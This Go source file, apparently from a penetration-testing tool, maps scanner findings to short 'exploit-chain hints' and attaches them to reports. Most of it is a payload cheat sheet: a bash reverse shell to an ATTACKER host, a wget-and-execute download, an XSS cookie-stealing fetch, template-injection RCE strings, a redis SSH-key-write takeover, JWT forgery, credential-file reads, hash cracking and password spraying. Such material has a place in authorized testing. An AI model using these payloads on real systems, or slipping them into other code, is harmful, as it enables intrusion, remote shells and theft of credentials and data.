package finding

import "strings"

// playbook maps a rule name (or rule prefix) to a short exploit-chain hint.
// One author guideline: the hint should answer "I just got this finding —
// what's the next concrete command / payload that moves me toward shell?"
// Keep each entry to 1-4 short lines. Long enough to be useful, short
// enough to fit in a markdown report.
var playbook = map[string]string{
	// ─── Web: injection ──────────────────────────────────────────────
	"sqli-error-based": `Confirm with sqlmap:
  sqlmap -u "<URL>" --batch --risk=3 --level=5 --dump
For MySQL/MariaDB also try: UNION SELECT for fast extraction.
For MSSQL: try xp_cmdshell for OS RCE. For Postgres: COPY FROM PROGRAM.`,
	"sqli-time-based": `Same as error-based but blind. sqlmap auto-handles --technique=T.
  sqlmap -u "<URL>" --batch --technique=T --dbms=<engine>
If extraction is slow, narrow to specific tables: --tables -D <db>.`,
	"cmdi-marker": `RCE confirmed. Get a reverse shell:
  payload=';bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'
Start listener: nc -lvnp 4444. URL-encode payload as needed.
For Windows: ';powershell -e <base64-encoded-revshell>'`,
	"cmdi-time-based": `Blind RCE. Reverse shell via OOB (DNS exfil) or write a file:
  payload=';wget http://ATTACKER/shell.sh -O /tmp/s;sh /tmp/s'
Then nc listener. If outbound is filtered, try ICMP / DNS exfil.`,
	"ssti": `RCE via template. Engine identified in evidence — chain to OS commands:
  Jinja2:    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  Twig:      {{['id']|filter('system')}}
  Velocity:  #set($e='e');$e.getClass().forName('java.lang.Runtime')...
  ERB:       <%= ` + "`id`" + ` %>
Get a shell then reverse-shell via netcat / Python.`,
	"lfi-path-traversal": `Read more secrets and chain to RCE:
  /etc/shadow            (if web user is root)
  /root/.ssh/id_rsa      (private key for SSH foothold)
  /var/www/html/wp-config.php   (DB creds)
  php://filter/convert.base64-encode/resource=index.php  (source)
RCE chains: log poisoning (/var/log/apache2/access.log + UA inject),
/proc/self/environ (PHP<5.4), session-file inclusion, expect:// wrapper.`,
	"xss-reflected": `Steal session cookies / pivot to admin actions:
  <script>fetch('http://ATTACKER/?c='+document.cookie)</script>
Craft phishing URL → send to higher-privileged victim.
If app uses HttpOnly cookies, pivot to CSRF actions instead.`,

	// ─── Web: authn / authz ──────────────────────────────────────────
	"bola-cross-user-access":  `Iterate IDs (numeric / UUID) to exfil other users' data. Pipe to a list:
  for i in $(seq 1 1000); do curl -s "<URL>" -H "Auth: <token>"; done
Pivot: read admin / staff resources for credentials, internal docs, etc.`,
	"broken-auth-anon-access": `Endpoint accessible without auth. Iterate and dump:
  for i in $(seq 1 1000); do curl -s "<URL with i>" >> dump.txt; done`,
	"idor-mutated-id":         `Same as BOLA but ngehe discovered the ID class. Fuzz adjacent IDs.`,
	"mass-assign-reflected":   `Server bound a forbidden field. Try elevating yourself:
  curl -X POST <URL> -d '{"role":"admin","isAdmin":true,"verified":true}' -H 'Authorization: <token>'
Then re-login and check for admin endpoints.`,
	"mass-assign-accepted":    `Field silently accepted. Confirm by re-fetching the resource and inspecting state.`,
	"default-credentials":     `Log in with the credentials. Look for:
  - Command-exec on admin pages (Tomcat Manager: deploy WAR)
  - File upload endpoints (write a webshell)
  - DB query interfaces (xp_cmdshell on MSSQL)`,
	"jwt-alg-none":            `Forge any token:
  echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
  echo -n '{"sub":"admin"}' | base64 | tr -d '='
Final token: <header>.<payload>. (note trailing dot, empty signature)`,
	"jwt-weak-secret":         `Crack the secret with hashcat or john:
  hashcat -m 16500 token.txt rockyou.txt
Then forge admin token with the cracked secret.`,
	"jwt-no-exp-check":        `Replay leaked tokens forever. If you have an old user token, it still works.`,
	"jwt-no-iss-check":        `Mint your own token in a parallel domain — server won't reject foreign iss.`,
	"jwt-no-aud-check":        `Token issued for service A may work on service B.`,
	"jwt-kid-injection":       `Inject a kid that points to a known file:
  kid=/dev/null → HMAC key is empty → trivially forgeable.
  kid=/proc/self/cmdline → HMAC key is the cmdline (sometimes predictable).`,
	"ssrf":                    `Probe internal services. Already covered:
  - Cloud metadata: AWS/GCP/Azure (ngehe hit one of these)
  - Internal admin panels: 127.0.0.1:<port>
  - Database ports: redis (gopher://), MySQL handshakes
For AWS, extract IAM role creds → aws-cli with them → escalate in cloud.`,

	// ─── Web: misconfig ──────────────────────────────────────────────
	"sensitive-file": `Read the file then escalate:
  .git/HEAD → git history → use git-dumper to clone, then grep for creds:
    git-dumper http://target/.git . && grep -rE "(password|secret|token|api_key)" .
  .env → read env vars (DB creds, SECRET_KEY for session forging, AWS keys)
  .htpasswd → crack with hashcat -m 1600 or john
  phpinfo → review for disable_functions bypass / loaded extensions / paths`,
	"sensitive-path":       `Path returned 200 but ngehe can't fingerprint it. Open in a browser.`,
	"dir-discovery":        `Path exists. 401/403 → has real auth, target it. 2xx → explore for forms/uploads/admin panels.`,
	"server-header":        `Note version for CVE lookup: searchsploit '<server>' <version>`,
	"x-powered-by":         `Note framework version for CVE lookup: searchsploit '<framework>' <version>`,
	"tech-fingerprint":     `Identified stack. Look up CVEs / known default creds for this tech.`,
	"dir-bruteforce-skipped": `Target is a catch-all SPA. Inspect the JS bundle directly — it reveals real API endpoints.`,

	// ─── Non-HTTP services ───────────────────────────────────────────
	"ssh-banner":                    `Run searchsploit on the version. CVE-2018-15473 (OpenSSH ≤7.7) → user enum via kerbrute-equivalent.`,
	"ssh-old-openssh":               `Old OpenSSH — searchsploit for CVEs. CVE-2008-0166 (Debian weak keys) applies to OpenSSH from old Debian rebuilds.`,
	"ssh-libssh-auth-bypass":        `CVE-2018-10933 — auth bypass. PoC:
  python3 -c "import paramiko; client=paramiko.SSHClient(); ..." (or use the public PoC).`,
	"ssh-cve-2018-15473":            `Username enumeration. Use kerbrute or a python PoC to enumerate valid users, then password-spray.`,
	"ssh-none-auth-allowed":         `Log in immediately: ssh user@host  (just press enter for password).`,
	"ssh-auth-methods":              `If publickey is listed and you have any leaked key from web findings (e.g. via LFI), try it: ssh -i id_rsa user@host`,
	"ssh-accepted-bogus-creds":      `Server accepted a known-bogus password. SSH is fully broken — log in as any user.`,
	"ftp-banner":                    `Banner version → searchsploit. Old vsftpd 2.3.4 has a backdoor (smiley-face exploit).`,
	"ftp-anonymous-allowed":         `Log in: ftp anonymous@host . Look for SSH keys, config files, /etc/passwd.`,
	"ftp-anonymous-listing":         `Spider all files: wget -r ftp://anonymous@host/`,
	"smb-null-session-allowed":      `Enumerate further: enum4linux-ng -A host . Look for user lists, shares with writeable access.`,
	"smb-anonymous-allowed":         `Same — pivot to listing shares: smbmap -H host -u anonymous`,
	"smb-guest-allowed":             `Connect: smbclient //host/<share> -U guest`,
	"snmp-community-accepted":       `Walk the MIB: snmpwalk -v2c -c <community> <host> . Look for installed software / running procs / user names.`,
	"ldap-anonymous-bind":           `Enumerate everything: ldapsearch -x -H ldap://host -b "<basedn>" . Save users.txt for password spray / AS-REP roast.`,
	"ldap-root-dse":                 `Domain name extracted — use it as the realm for Kerberos attacks.`,
	"ldap-user-enum":                `Pipe users to kerbrute: kerbrute userenum -d <domain> --dc <DC> users.txt`,
	"ldap-asrep-roastable":          `ngehe's kerberos.ASREPRoast will produce hashes — or use impacket: GetNPUsers.py <domain>/ -no-pass -usersfile users.txt`,
	"dns-axfr-allowed":              `Zone transferred. Add every hostname to /etc/hosts and treat them as new vhost targets.`,
	"dns-subdomain":                 `Subdomain resolved → run ngehe recon against it.`,
	"vhost-discovery":               `Add to /etc/hosts: <target-ip> <vhost> . Then run ngehe recon http://<vhost>`,
	"db-default-creds-mysql":        `Log in: mysql -h <host> -u <user> -p<pass> . Read information_schema for secrets, mysql.user for hashes (crack with hashcat -m 300).`,
	"db-default-creds-postgres":     `Log in: psql -h <host> -U <user> -W . COPY FROM PROGRAM 'sh -c "<rev shell>"' works on superuser.`,
	"db-default-creds-mssql":        `Log in: mssqlclient.py <user>:<pass>@<host> . xp_cmdshell for RCE: enable it via sp_configure if disabled.`,
	"db-no-auth-redis":              `Classic SSH-key write to RCE:
  redis-cli -h host CONFIG SET dir /root/.ssh/
  redis-cli -h host CONFIG SET dbfilename authorized_keys
  echo -e "\\n\\n$(cat id_rsa.pub)\\n\\n" | redis-cli -h host -x SET pwn
  redis-cli -h host SAVE
  ssh -i id_rsa root@host`,
	"port-open":                     `Run a service-specific scanner next — ngehe box does this automatically for known services.`,
	"kerberos-asrep-roast":          `Crack: hashcat -m 18200 hash.txt rockyou.txt`,
	"kerberos-kerberoast":           `Crack: hashcat -m 13100 hash.txt rockyou.txt`,
	"bloodhound-collect":            `Open BloodHound, ingest the JSON files, run "Shortest paths to Domain Admins".`,
	"ntlm-spray-hit":                `Valid creds. Test them everywhere — SMB, WinRM, RDP, LDAP. Use crackmapexec / netexec to spray internally.`,
}

// Lookup returns the playbook hint for a rule. Tries exact match first,
// then falls back to a prefix match (so "jwt-weak-secret-secret" finds
// "jwt-weak-secret").
func Lookup(rule string) string {
	if hint, ok := playbook[rule]; ok {
		return hint
	}
	for k, v := range playbook {
		if strings.HasPrefix(rule, k) {
			return v
		}
	}
	return ""
}

// Enrich populates Next on each finding from the playbook. Safe to call
// multiple times; only fills empty Next fields.
func Enrich(findings []Finding) []Finding {
	for i := range findings {
		if findings[i].Next == "" {
			findings[i].Next = Lookup(findings[i].Rule)
		}
	}
	return findings
}
